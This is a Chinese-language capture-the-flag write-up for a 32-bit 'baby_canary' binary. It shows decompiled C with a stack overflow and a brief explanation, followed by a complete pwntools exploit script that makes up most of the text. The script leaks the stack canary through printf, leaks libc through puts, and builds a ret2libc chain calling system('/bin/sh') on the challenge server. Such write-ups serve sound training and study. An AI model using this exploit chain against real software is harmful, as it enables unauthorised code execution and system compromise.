考点：[[printf 不截断导致泄漏]]，栈溢出，[[ret2libc]]

```c
unsigned int func()
{
  _BYTE s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  unsigned int v2; // [esp+4Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  memset(s, 0, sizeof(s));
  puts("So can you tell me who you are?");
  read(0, s, 256u);
  printf("Wow.. %s is a good name...", s);
  puts("\nSo what you come there for?");
  fflush(stdout);
  read(0, s, 0x100u);
  puts("That's good...But you need to escape from the canary before you get the flag!");
  fflush(stdout);
  return v2 - __readgsdword(0x14u);
}						
```

太套路化了，先利用 printf 把 canary 打印出来，然后泄漏 libc 偏移，找 libc 版本号，找一个 one_gadget 打 ret2libc 就好了。


```py
from pwn import *

p = remote('sec.arttnba3.cn',10003)
e = ELF('./baby_canary')
libc = ELF('./libc.so.6')

puts_got = e.got['puts']
puts_plt = e.plt['puts']

p.recv()
payload1 = b'A'*(0x4c-0xc+1)
p.send(payload1)
p.recvuntil(payload1)
canary = u32(b'\x00'+p.recv(3))
p.recv()

payload2 = b'A'*(0x4c-0xc) + p32(canary) + b'A'*(0xc-4) + p32(0xdeadbeef) + p32(puts_plt)+ p32(e.sym['main']) + p32(puts_got)

p.send(payload2)
p.recvuntil('flag!\n')

puts_addr = p.recv(4)

puts_addr = u32(puts_addr)

libc_base = puts_addr - libc.sym['puts']
sys_addr = libc_base + libc.sym['system']
sh_addr = libc_base + libc.search(b'/bin/sh').__next__()

p.send(payload1)
payload3 = b'A'*(0x4c-0xc) + p32(canary) + b'A'*(0xc-4) + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)
p.send(payload3)
p.interactive()
```